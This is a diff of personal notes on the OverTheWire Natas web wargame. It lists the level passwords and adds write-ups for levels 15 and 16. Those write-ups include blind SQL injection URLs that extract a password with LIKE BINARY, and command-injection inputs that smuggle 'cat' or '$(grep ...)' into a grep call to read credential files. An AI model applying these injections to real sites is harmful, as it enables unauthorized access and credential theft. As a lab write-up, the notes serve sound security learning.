@@ -2,20 +2,21 @@
 title: natas
 ---
 
-- [natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi](#natas2zluruathqk7q2mqmdetiuij2zvwy2mbi)
-- [natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14](#natas3sjijnw6ucpu6hpz1zachadtwd7ogrd14)
-- [natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ](#natas4z9tkrkwmpt9qr7xrr5jwrkgou901swez)
-- [natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq](#natas5ix6iofmpn7ayoqgpwtn3fxpbajvjchfq)
-- [natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1](#natas6agoy4q2dc6mgdq4ol4ytoktyag9peha1)
-- [natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9](#natas77z3heenjqtflzgnt29q7wavmnfzdh0i9)
-- [natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe](#natas8dbfubfqqg69kvjvj1iabmoipwsnq9bwe)
-- [natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl](###natas9w0mmhucrrng8dcghe4qvk3ja9lgt8ndl)
-- [natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu](#natas10nopp1igqakuzai1guujzn1bfvj7xcnzu)
-- [natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK](#natas11u82q5tcmmq9xufoi3dyx61s7ozd9jkok)
-- [natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3](#natas12edxp0ps26wlkhzy1rdbpuzk0rkflgir3)
-- [natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY](#natas13jmlty0qipzbbakc9341cqpqzbjv7mqby)
-- [natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1](#natas14lg96m10tdfapyvbkjdjymbllq5l6qdl1)
-- [natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J](#natas15awwj0w5cvxrziongz9j5stnvkmxdk39j)
+* [natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi](#natas2-zluruathqk7q2mqmdetiuij2zvwy2mbi)
+* [natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14](#natas3-sjijnw6ucpu6hpz1zachadtwd7ogrd14)
+* [natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ](#natas4-z9tkrkwmpt9qr7xrr5jwrkgou901swez)
+* [natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq](#natas5-ix6iofmpn7ayoqgpwtn3fxpbajvjchfq)
+* [natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1](#natas6-agoy4q2dc6mgdq4ol4ytoktyag9peha1)
+* [natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9](#natas7-7z3heenjqtflzgnt29q7wavmnfzdh0i9)
+* [natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe](#natas8-dbfubfqqg69kvjvj1iabmoipwsnq9bwe)
+* [natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl](#natas9-w0mmhucrrng8dcghe4qvk3ja9lgt8ndl)
+* [natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu](#natas10-nopp1igqakuzai1guujzn1bfvj7xcnzu)
+* [natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK](#natas11-u82q5tcmmq9xufoi3dyx61s7ozd9jkok)
+* [natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3](#natas12-edxp0ps26wlkhzy1rdbpuzk0rkflgir3)
+* [natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY](#natas13-jmlty0qipzbbakc9341cqpqzbjv7mqby)
+* [natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1](#natas14-lg96m10tdfapyvbkjdjymbllq5l6qdl1)
+* [natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J](#natas15-awwj0w5cvxrziongz9j5stnvkmxdk39j)
+* [natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh](#natas16-waiheacj63wnnibroheqi3p9t0m5nhmh)
 
 passwords location: /etc/natas_webpass/natas#
 
@@ -183,7 +184,91 @@ google sql injection to bypass, ' or 1=1 -- doesn't work but " or 1=1 -- does (c
 
 ### natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 
-username, check existence
+Given username input with check existence button
 
-- admin, NULL, >64 chars: doesn't exist
-- " or 1=1 --: error → no res (response from query)
+Source code:
+
+```php
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+```
+
+Tests:
+- admin, NULL, >64 chars → doesn't exist
+- " or 1=1 -- → error → from source code: no $res (response from $query)
+- natas16 → exists
+
+→ also works: http://natas15.natas.labs.overthewire.org/index.php?username=natas16
+
+→ debug: http://natas15.natas.labs.overthewire.org/index.php?username=natas16&debug
+
+blind sql injection
+
+Executing query: SELECT * from users where username="natas16"
+
+want:
+
+Executing query: SELECT * from users where username="natas16 *and password="password*"
+
+http://natas15.natas.labs.overthewire.org/index.php?username=natas16" and password="password&debug
+
+to search password: password LIKE BINARY %test%
+
+natas15.natas.labs.overthewire.org/index.php?username=natasqs16"+and+password+LIKE+BINARY+"%W%&debug
+
+we know password will be 32chars (all others are)
+
+script to find: <coming soon>
+
+→ success!
+
+### natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+For security reasons, we now filter even more on certain characters
+
+Find words containing: <input needle>
+
+Search
+
+<dictionary output>
+
+Source code:
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+
+blocks [ ; | & ` ' " ] (' is escaped with \)
+
+Bypass?
+
+- ideal input: "dog; cat /etc/natas_pass/natas17"
+- use array → but [] is blocked
+- multiline → doesn't work
+- replace ; with ,  :  :,  %3B  CHAR59  /*;*/ → no success, either no output or detected
+
+Not possible...
+
+passwords$(grep <a> /etc/natas_webpass/natas17)
+
+<script coming soon>
+
+→ success!
